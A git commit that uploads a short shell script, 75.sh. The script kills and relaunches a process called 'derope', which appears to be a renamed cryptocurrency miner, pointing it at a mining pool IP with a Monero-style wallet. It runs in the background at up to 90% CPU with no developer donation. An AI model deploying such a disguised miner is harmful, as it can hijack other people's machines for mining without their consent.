61d42a75c27b01cfa1ec41a819cc09191b7112de
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-18 22:24:54 +0200

    Add files via upload

---
+++ 75.sh
@@ -0,0 +1,3 @@
+pkill derope
+sleep 7
+derope -o 95.216.213.239:3635 -u 44X3tNzFXwZet6y87T1R61gqzBZ9f4yMH9ur4baLxTeEDnfkyJKqRcTEtkqXMfZ6BhTqB8jgYSP5YRbtjAEHRjeqBozqe29 --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=90 --av=1 --variant -1
